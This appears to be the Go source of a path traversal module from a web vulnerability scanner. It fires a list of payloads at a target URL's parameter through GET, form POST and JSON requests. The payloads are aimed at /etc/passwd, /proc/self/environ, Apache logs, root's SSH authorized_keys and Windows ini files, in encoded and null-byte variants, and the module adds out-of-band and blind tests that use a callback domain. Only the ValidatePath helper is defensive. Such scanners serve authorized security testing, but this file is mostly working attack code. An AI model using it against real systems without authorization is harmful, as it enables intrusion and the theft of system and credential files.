package traversal

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"path/filepath"
	"strings"
	"time"
)

type Finding struct {
	URL       string    `json:"url"`
	Type      string    `json:"type"`
	Payload   string    `json:"payload"`
	Evidence  string    `json:"evidence"`
	Severity  string    `json:"severity"`
	Confirmed bool      `json:"confirmed"`
	Timestamp time.Time `json:"timestamp"`
}

type Engine struct {
	client      *http.Client
	oobDomain   string
	allowedBase string
}

func NewEngine(oobDomain string) *Engine {
	return &Engine{
		client:    &http.Client{Timeout: 15 * time.Second},
		oobDomain: oobDomain,
	}
}

func NewEngineWithBase(oobDomain, allowedBase string) (*Engine, error) {
	clean := filepath.Clean(allowedBase)
	if !filepath.IsAbs(clean) {
		return nil, fmt.Errorf("allowed base must be an absolute path")
	}
	return &Engine{
		client:      &http.Client{Timeout: 15 * time.Second},
		oobDomain:   oobDomain,
		allowedBase: clean,
	}, nil
}

func (e *Engine) SetAllowedBase(base string) error {
	clean := filepath.Clean(base)
	if !filepath.IsAbs(clean) {
		return fmt.Errorf("allowed base must be an absolute path")
	}
	e.allowedBase = clean
	return nil
}

func ValidatePath(targetPath, allowedBase string) (string, error) {
	clean := filepath.Clean(targetPath)

	if !filepath.IsAbs(clean) {
		clean = filepath.Join(allowedBase, clean)
	}

	clean = filepath.Clean(clean)

	if !strings.HasPrefix(clean, filepath.Clean(allowedBase)+string(filepath.Separator)) && clean != filepath.Clean(allowedBase) {
		return "", fmt.Errorf("path %q escapes allowed base %q", targetPath, allowedBase)
	}

	if strings.Contains(targetPath, "..") {
		rel, err := filepath.Rel(allowedBase, clean)
		if err != nil {
			return "", fmt.Errorf("invalid path: %w", err)
		}
		if strings.HasPrefix(rel, "..") {
			return "", fmt.Errorf("path traversal detected in %q", targetPath)
		}
	}

	return clean, nil
}

var traversalPayloads = []struct {
	name    string
	payload string
	check   func(string) bool
}{
	{
		name:    "Basic /etc/passwd",
		payload: "../../../../etc/passwd",
		check:   func(b string) bool { return strings.Contains(b, "root:") || strings.Contains(b, "/bin/bash") },
	},
	{
		name:    "Encoded /etc/passwd",
		payload: "..%2f..%2f..%2f..%2fetc%2fpasswd",
		check:   func(b string) bool { return strings.Contains(b, "root:") || strings.Contains(b, "/bin/bash") },
	},
	{
		name:    "Double encoded",
		payload: "..%252f..%252f..%252f..%252fetc%252fpasswd",
		check:   func(b string) bool { return strings.Contains(b, "root:") || strings.Contains(b, "/bin/bash") },
	},
	{
		name:    "Null byte",
		payload: "../../../../etc/passwd%00",
		check:   func(b string) bool { return strings.Contains(b, "root:") || strings.Contains(b, "/bin/bash") },
	},
	{
		name:    "Windows boot.ini",
		payload: "..\\..\\..\\..\\boot.ini",
		check: func(b string) bool {
			return strings.Contains(b, "[boot loader]") || strings.Contains(b, "[operating systems]")
		},
	},
	{
		name:    "Windows win.ini",
		payload: "..\\..\\..\\..\\windows\\win.ini",
		check:   func(b string) bool { return strings.Contains(b, "[fonts]") || strings.Contains(b, "[extensions]") },
	},
	{
		name:    "UNC path",
		payload: "\\\\localhost\\c$\\windows\\win.ini",
		check:   func(b string) bool { return strings.Contains(b, "[fonts]") },
	},
	{
		name:    "Proc self environ",
		payload: "../../../../proc/self/environ",
		check:   func(b string) bool { return strings.Contains(b, "PATH=") || strings.Contains(b, "HOME=") },
	},
	{
		name:    "Proc version",
		payload: "../../../../proc/version",
		check:   func(b string) bool { return strings.Contains(b, "Linux") || strings.Contains(b, "version") },
	},
	{
		name:    "Apache access log",
		payload: "../../../../var/log/apache2/access.log",
		check: func(b string) bool {
			return strings.Contains(b, "GET") || strings.Contains(b, "POST") || strings.Contains(b, "Mozilla")
		},
	},
	{
		name:    "Apache error log",
		payload: "../../../../var/log/apache2/error.log",
		check:   func(b string) bool { return strings.Contains(b, "[error]") || strings.Contains(b, "[warn]") },
	},
	{
		name:    "SSH authorized keys",
		payload: "../../../../root/.ssh/authorized_keys",
		check:   func(b string) bool { return strings.Contains(b, "ssh-rsa") || strings.Contains(b, "ssh-ed25519") },
	},
}

func (e *Engine) TestAll(target string, paramName string) ([]Finding, error) {
	parsed, err := url.Parse(target)
	if err != nil {
		return nil, fmt.Errorf("invalid target URL: %w", err)
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return nil, fmt.Errorf("target URL must use http or https scheme")
	}

	var findings []Finding

	for _, p := range traversalPayloads {
		testURL := fmt.Sprintf("%s?%s=%s", target, paramName, url.QueryEscape(p.payload))

		f, err := e.testURL(testURL, p.name, p.payload, p.check)
		if err == nil && f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func (e *Engine) TestPOST(target string, paramName string) ([]Finding, error) {
	parsed, err := url.Parse(target)
	if err != nil {
		return nil, fmt.Errorf("invalid target URL: %w", err)
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return nil, fmt.Errorf("target URL must use http or https scheme")
	}

	var findings []Finding

	for _, p := range traversalPayloads {
		formData := fmt.Sprintf("%s=%s", paramName, url.QueryEscape(p.payload))

		req, err := http.NewRequest("POST", target, strings.NewReader(formData))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		f, err := e.testRequest(req, p.name, p.payload, p.check)
		if err == nil && f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func (e *Engine) TestJSON(target string, paramName string) ([]Finding, error) {
	parsed, err := url.Parse(target)
	if err != nil {
		return nil, fmt.Errorf("invalid target URL: %w", err)
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return nil, fmt.Errorf("target URL must use http or https scheme")
	}

	var findings []Finding

	for _, p := range traversalPayloads {
		body := fmt.Sprintf(`{"%s":"%s"}`, paramName, p.payload)

		req, err := http.NewRequest("POST", target, strings.NewReader(body))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		f, err := e.testRequest(req, p.name, p.payload, p.check)
		if err == nil && f != nil {
			findings = append(findings, *f)
		}
	}

	return findings, nil
}

func (e *Engine) TestOOB(target string, paramName string) (*Finding, error) {
	if e.oobDomain == "" {
		return nil, fmt.Errorf("OOB domain not configured")
	}

	parsed, err := url.Parse(target)
	if err != nil {
		return nil, fmt.Errorf("invalid target URL: %w", err)
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return nil, fmt.Errorf("target URL must use http or https scheme")
	}

	payload := fmt.Sprintf("http://%s/../../../../etc/passwd", e.oobDomain)

	testURL := fmt.Sprintf("%s?%s=%s", target, paramName, url.QueryEscape(payload))

	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return nil, err
	}

	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return &Finding{
		URL:       testURL,
		Type:      "traversal_oob",
		Payload:   payload,
		Evidence:  fmt.Sprintf("OOB callback expected at %s", e.oobDomain),
		Severity:  "high",
		Confirmed: false,
		Timestamp: time.Now(),
	}, nil
}

func (e *Engine) TestBlind(target string, paramName string) (*Finding, error) {
	if e.oobDomain == "" {
		return nil, fmt.Errorf("OOB domain not configured")
	}

	parsed, err := url.Parse(target)
	if err != nil {
		return nil, fmt.Errorf("invalid target URL: %w", err)
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return nil, fmt.Errorf("target URL must use http or https scheme")
	}

	payload := fmt.Sprintf("http://%s/?file=../../../../etc/passwd", e.oobDomain)

	testURL := fmt.Sprintf("%s?%s=%s", target, paramName, url.QueryEscape(payload))

	start := time.Now()
	resp, err := e.client.Get(testURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	duration := time.Since(start)

	return &Finding{
		URL:       testURL,
		Type:      "traversal_blind",
		Payload:   payload,
		Evidence:  fmt.Sprintf("Blind traversal test completed in %v, check OOB logs at %s", duration, e.oobDomain),
		Severity:  "medium",
		Confirmed: false,
		Timestamp: time.Now(),
	}, nil
}

func (e *Engine) testURL(testURL, name, payload string, check func(string) bool) (*Finding, error) {
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "ARES-Traversal/1.0")

	return e.testRequest(req, name, payload, check)
}

func (e *Engine) testRequest(req *http.Request, name, payload string, check func(string) bool) (*Finding, error) {
	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}

	if check(string(body)) {
		return &Finding{
			URL:       req.URL.String(),
			Type:      "path_traversal",
			Payload:   payload,
			Evidence:  string(body)[:minInt(len(body), 500)],
			Severity:  "high",
			Confirmed: true,
			Timestamp: time.Now(),
		}, nil
	}

	return nil, fmt.Errorf("no traversal detected for: %s", name)
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
